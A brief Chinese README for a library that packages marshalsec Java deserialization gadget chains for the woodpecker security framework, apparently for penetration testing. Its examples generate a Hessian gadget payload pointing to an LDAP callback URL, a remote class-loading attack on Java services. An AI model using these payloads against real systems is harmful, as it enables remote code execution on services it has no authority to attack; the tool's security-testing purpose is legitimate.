# marshalsec-for-woodpecker

## 0x01 简介
`marshalsec-for-woodpecker`是基于 [marshalsec](https://github.com/mbechler/marshalsec)开放第三方调用api ,为woodpecker框架定制开发的各类反序列化gadget集成库。

## 0x02 api调用


#### 2.1 public Object getObject(String gadgetName,String[] gadgetArgs)

返回gadget对象

例子:
```
new Hessian().apiRun("SpringPartiallyComparableAdvisorHolder",new String[]{"ldap://127.0.0.1:138/obj"})
```

#### 2.2 public byte[] apiRun(String gadgetName,String[] gadgetArgs)

返回gadget对象，序列化之后的数据

例子:
```
new Hessian().apiRun("SpringPartiallyComparableAdvisorHolder",new String[]{"ldap://127.0.0.1:138/obj"})
```